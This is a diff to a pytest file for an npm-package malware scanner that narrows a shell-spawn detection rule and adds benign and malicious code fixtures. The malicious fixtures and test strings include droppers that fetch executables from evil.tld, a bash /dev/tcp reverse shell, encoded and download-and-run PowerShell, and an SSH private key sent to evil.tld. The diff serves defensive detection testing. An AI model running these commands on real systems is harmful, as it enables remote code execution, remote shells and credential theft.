@@ -920,6 +920,44 @@ BENIGN_PACKAGE_CODE = {
         "const entry = cache.fetch(key);\n"
         "if (!entry) { cp.execSync('git rev-parse HEAD'); }\n"
     ),
+    # --- F38: Windows support code. Both were DO NOT INSTALL because
+    # `shell process spawned` read "an interpreter was invoked" as an attack.
+    #
+    # vite: fixing the console code page before reading a child's output.
+    "vite powershell console encoding": (
+        "const { execSync } = require('child_process');\n"
+        "execSync(`powershell -NoProfile -Command "
+        '"[Console]::OutputEncoding=[System.Text.Encoding]::UTF8"`);\n'
+    ),
+    # app-builder-lib: asking Windows whether PowerShell 7 is installed. The
+    # argv is a real flag list, which is what separates it from `spawn(sh, [])`.
+    "app-builder-lib pwsh probe": (
+        "const cp = require('child_process');\n"
+        'cp.exec("powershell.exe", ["-NoProfile", "-NonInteractive",\n'
+        '        "-Command", "Get-Command pwsh.exe"]);\n'
+    ),
+    # next: the dev overlay's "open this stack frame in my editor" launcher —
+    # a third false danger the 2,080-package sweep surfaced, and the reason the
+    # no-command arm must require an EMPTY argv rather than a short one.
+    "next launch editor via cmd": (
+        "const child_process = require('child_process');\n"
+        'const p = child_process.spawn("cmd.exe", [\n'
+        '    "/C",\n'
+        "    editor\n"
+        "].concat(args), { stdio: 'inherit' });\n"
+    ),
+    # A shell IS the normal way to run a build step; the command is the point.
+    "shell running a build command": (
+        "const cp = require('child_process');\n"
+        "cp.execSync('/bin/sh -c \"npm run build\"');\n"
+        "cp.spawn('/bin/sh', ['-c', script], { stdio: 'inherit' });\n"
+    ),
+    # `-ec` is PowerShell's encoded-command alias AND POSIX shell's
+    # errexit+command pair. Only the PowerShell reading is an attack.
+    "bash errexit command": (
+        "const cp = require('child_process');\n"
+        "cp.execSync('bash -ec \"npm run test\"');\n"
+    ),
 }
 
 #: Real npm-malware shapes. Each must survive calibration as a DANGER.
@@ -979,6 +1017,19 @@ MALICIOUS_PACKAGE_CODE = {
         "const { spawnSync } = require('child_process');\n"
         "const out = spawnSync('cat', [home + '/.ssh/id_rsa']).stdout;\n"
         "axios.post('https://evil.tld/collect', { out });\n"
+    ),
+    # --- F38: the shapes the narrowed `shell process spawned` must keep. The
+    # first two were already fixtures; these are the forms the narrowing had to
+    # reach for deliberately.
+    "encoded powershell payload": (
+        "const { execSync } = require('child_process');\n"
+        "execSync('powershell -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0A');\n"
+    ),
+    # The payload sits in the argv array, not the first string literal — which
+    # the old first-literal-only pattern could not see at all.
+    "dropper in the argument array": (
+        "const cp = require('child_process');\n"
+        "cp.execFile('cmd.exe', ['/c', 'curl http://evil.tld/a.exe -o a.exe']);\n"
     ),
 }
 
@@ -1283,6 +1334,150 @@ def test_the_wiring_patterns_are_dangers_and_corroborate(description):
     assert corroborated_capabilities(
         [("a.js", description), ("a.js", "eval() - dynamic code execution")]
     ) == ["eval() - dynamic code execution"]
+
+
+# ---------------------------------------------------------------------------
+# F38 — invoking an interpreter is not an attack
+#
+# `shell process spawned` was "a raw shell binary was spawned", measured at zero
+# over 480 packages. The wider corpus finds Windows support code: `vite` asks
+# PowerShell to set the console code page, `app-builder-lib` asks it whether
+# pwsh is installed, `next` opens a stack frame in your editor. Because the
+# pattern is always-dangerous AND a context signal, each hit both condemned its
+# package and escalated every capability in the file — 6 of the 8 remaining
+# false danger lines over 736 packages came from this one match. Narrowed to the
+# two shapes an attacker actually needs: a shell handed NO command (the reverse
+# shell), and a command line carrying a payload. Re-measured over 2,080 real
+# installed packages (82,677 files): old 4 hits / 3 packages, all false; new 0.
+# ---------------------------------------------------------------------------
+
+
+SHELL_DESCRIPTION = "shell process spawned"
+
+
+@pytest.mark.parametrize(
+    "code",
+    [
+        # The reverse shell, in the forms it is written.
+        "cp.spawn('/bin/sh', []);",
+        "cp.spawn('/bin/sh');",
+        'spawnSync("/bin/bash", []);',
+        "spawn('cmd.exe', []);",
+        "spawn('/bin/sh', [], { stdio: 'pipe' });",
+        "exec('/usr/bin/zsh');",
+        # A command line that delivers something.
+        "execSync('cmd.exe /c curl http://evil.tld/a.exe -o a.exe && a.exe');",
+        "exec('/bin/sh -c \"wget http://evil.tld/x -O /tmp/a\"');",
+        "execSync('bash -c \"bash -i >& /dev/tcp/10.0.0.9/4444 0>&1\"');",
+        "execSync('cmd.exe /c certutil -urlcache -f http://evil.tld/a.exe a.exe');",
+        "execFile('cmd.exe', ['/c', 'curl http://evil.tld/a.exe -o a.exe']);",
+        # PowerShell handing itself a payload rather than writing it out.
+        "execSync('powershell -enc SQBFAFgAIAAoAE4A');",
+        "execSync('powershell -c \"IEX (New-Object Net.WebClient).DownloadString(u)\"');",
+        "execSync('pwsh -Command \"[Convert]::FromBase64String($p)\"');",
+    ],
+)
+def test_an_attacker_shell_is_still_reported(code):
+    assert SHELL_DESCRIPTION in scan_text_for_malware_patterns(code), code
+
+
+@pytest.mark.parametrize(
+    "code",
+    [
+        # Every false danger the 2,080-package sweep found, verbatim.
+        'execSync(`powershell -NoProfile -Command '
+        '"[Console]::OutputEncoding=[System.Text.Encoding]::UTF8"`);',
+        'exec("powershell.exe", ["-NoProfile", "-NonInteractive", "-Command",'
+        ' "Get-Command pwsh.exe"]);',
+        'spawn("cmd.exe", ["/C", editor].concat(args), { stdio: "inherit" });',
+        # A shell with a command is how everything runs a build step.
+        "execSync('/bin/sh -c \"npm run build\"');",
+        "spawn('/bin/sh', ['-c', script], opts);",
+        "execSync('cmd.exe /c chcp 65001');",
+        "execSync('/bin/bash --version');",
+        "execSync('powershell -ExecutionPolicy Bypass -File ./scripts/format.ps1');",
+        # `-ec`/`-e` are POSIX shell flags too, so they only count for PowerShell.
+        "execSync('bash -ec \"npm run build\"');",
+        "execSync('sh -e ./scripts/release.sh');",
+        # The binary is a variable, which says nothing either way.
+        "spawn(shell, args, { name: 'xterm-color' });",
+    ],
+)
+def test_ordinary_shell_support_code_is_not_reported(code):
+    assert SHELL_DESCRIPTION not in scan_text_for_malware_patterns(code), code
+
+
+def test_a_bare_shell_name_inside_a_word_is_not_a_shell():
+    """`publish` ends in `sh`; without a boundary the payload arm matched it."""
+    hits = scan_text_for_malware_patterns(
+        "execSync('npm publish --tag next && curl -s https://registry.npmjs.org');"
+    )
+
+    assert SHELL_DESCRIPTION not in hits
+
+
+def test_the_shell_payload_check_does_not_cross_lines():
+    """A downloader on a *later* line is a different statement, not this call."""
+    hits = scan_text_for_malware_patterns(
+        "execSync('/bin/sh -c \"npm run build\"');\n"
+        "fetchWithCurl('http://registry.example.tld/manifest');\n"
+    )
+
+    assert SHELL_DESCRIPTION not in hits
+
+
+def test_a_payload_split_across_lines_is_the_known_gap():
+    """The price of the line bound, pinned rather than left implicit (F43).
+
+    The same call on one line IS reported; formatted over four, the payload sits
+    outside the window. That is right for a minified bundle — where a whole call
+    is one line — and wrong for pretty-printed source, so it is recorded as a
+    follow-up rather than widened here: `[\\s\\S]` would reach into the next
+    statement, which is the failure the F35 wiring window had to be capped for.
+    """
+    one_line = 'cp.spawn("cmd.exe", ["/C", "curl http://evil.tld/a.exe -o a.exe"]);'
+    formatted = (
+        'cp.spawn("cmd.exe", [\n'
+        '    "/C",\n'
+        '    "curl http://evil.tld/a.exe -o a.exe"\n'
+        "]);\n"
+    )
+
+    assert SHELL_DESCRIPTION in scan_text_for_malware_patterns(one_line)
+    assert SHELL_DESCRIPTION not in scan_text_for_malware_patterns(formatted)
+
+
+def test_windows_support_code_no_longer_escalates_its_own_capabilities():
+    """The second half of the F38 cost: the pattern was also a context signal.
+
+    One `powershell` hit escalated every capability in the file with it, so a
+    package that shells out anywhere reached DO NOT INSTALL through a line that
+    only asked Windows a question.
+    """
+    code = (
+        "const cp = require('child_process');\n"
+        "execSync(`powershell -NoProfile -Command "
+        '"[Console]::OutputEncoding=[System.Text.Encoding]::UTF8"`);\n'
+        "cp.spawnSync('node', [entry]);\n"
+    )
+
+    report = _classify_one_file(code)
+
+    assert report.corroborated == []
+    assert report.dangers == []
+
+
+def test_the_reverse_shell_still_escalates_its_capabilities():
+    """The context role is kept — it is now carried only by a real attack."""
+    report = _classify_one_file(MALICIOUS_PACKAGE_CODE["reverse shell"])
+
+    assert SHELL_DESCRIPTION in report.counts
+    assert "spawn() - process spawning" in report.corroborated
+
+
+def test_the_shell_pattern_keeps_both_of_its_roles():
+    assert is_dangerous_hit(SHELL_DESCRIPTION)
+    assert SHELL_DESCRIPTION in CONTEXT_DESCRIPTIONS
 
 
 @pytest.mark.parametrize("description", sorted(ALWAYS_DANGEROUS_DESCRIPTIONS))
